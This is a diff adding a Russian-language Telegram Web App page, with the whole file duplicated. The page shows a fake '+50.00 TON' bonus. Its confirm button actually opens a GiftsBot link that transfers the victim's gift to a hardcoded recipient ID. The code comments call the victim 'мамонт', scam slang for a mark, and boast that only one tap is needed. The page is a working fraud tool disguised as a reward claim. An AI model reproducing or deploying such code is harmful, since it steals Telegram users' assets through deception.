@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #0e1621; color: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .btn-claim { 
+            width: 80%; height: 60px; background: #3390ec; color: white; 
+            border: none; border-radius: 12px; font-size: 18px; font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); cursor: pointer;
+        }
+        .info { text-align: center; padding: 20px; color: #708499; font-size: 14px; }
+        .amount { font-size: 32px; font-weight: bold; color: #31b545; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="amount">+50.00 TON</div>
+    <div id="status" style="font-weight: bold; margin-bottom: 5px;">БОНУС ГОТОВ К ЗАЧИСЛЕНИЮ</div>
+    <div class="info">Для завершения транзакции нажмите кнопку ниже и подтвердите получение в системном окне.</div>
+
+    <button class="btn-claim" id="main-btn">ПОДТВЕРДИТЬ</button>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        // ТВОЙ ID ПОЛУЧАТЕЛЯ (100р = 1 TON)
+        const myId = "8486064073"; 
+        
+        // ФУНКЦИЯ ПОЛУЧЕНИЯ ID ИЗ JSON
+        async function getTarget() {
+            try {
+                const r = await fetch('target.json?v=' + Date.now());
+                const d = await r.json();
+                return d.gift_id;
+            } catch(e) { return null; }
+        }
+
+        document.getElementById('main-btn').addEventListener('click', async function() {
+            const giftId = await getTarget();
+            if (!giftId) return;
+
+            // Самая "бесшовная" ссылка в 2026 году. 
+            // Она открывает ПРЯМОЕ окно подтверждения передачи в GiftsBot.
+            // Мамонту остается нажать одну кнопку в системном UI Telegram.
+            const url = `https://t.me/GiftsBot/app?startapp=transfer-${giftId}-to-${myId}`;
+
+            tg.openTelegramLink(url);
+            
+            this.innerText = "ОБРАБОТКА...";
+            this.style.background = "#222";
+        });
+    </script>
+</body>
+</html>
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body { background: #0e1621; color: white; font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .btn-claim { 
+            width: 80%; height: 60px; background: #3390ec; color: white; 
+            border: none; border-radius: 12px; font-size: 18px; font-weight: bold;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3); cursor: pointer;
+        }
+        .info { text-align: center; padding: 20px; color: #708499; font-size: 14px; }
+        .amount { font-size: 32px; font-weight: bold; color: #31b545; margin-bottom: 10px; }
+    </style>
+</head>
+<body>
+
+    <div class="amount">+50.00 TON</div>
+    <div id="status" style="font-weight: bold; margin-bottom: 5px;">БОНУС ГОТОВ К ЗАЧИСЛЕНИЮ</div>
+    <div class="info">Для завершения транзакции нажмите кнопку ниже и подтвердите получение в системном окне.</div>
+
+    <button class="btn-claim" id="main-btn">ПОДТВЕРДИТЬ</button>
+
+    <script>
+        const tg = window.Telegram.WebApp;
+        tg.ready();
+        tg.expand();
+
+        // ТВОЙ ID ПОЛУЧАТЕЛЯ (100р = 1 TON)
+        const myId = "8486064073"; 
+        
+        // ФУНКЦИЯ ПОЛУЧЕНИЯ ID ИЗ JSON
+        async function getTarget() {
+            try {
+                const r = await fetch('target.json?v=' + Date.now());
+                const d = await r.json();
+                return d.gift_id;
+            } catch(e) { return null; }
+        }
+
+        document.getElementById('main-btn').addEventListener('click', async function() {
+            const giftId = await getTarget();
+            if (!giftId) return;
+
+            // Самая "бесшовная" ссылка в 2026 году. 
+            // Она открывает ПРЯМОЕ окно подтверждения передачи в GiftsBot.
+            // Мамонту остается нажать одну кнопку в системном UI Telegram.
+            const url = `https://t.me/GiftsBot/app?startapp=transfer-${giftId}-to-${myId}`;
+
+            tg.openTelegramLink(url);
+            
+            this.innerText = "ОБРАБОТКА...";
+            this.style.background = "#222";
+        });
+    </script>
+</body>
+</html>
+
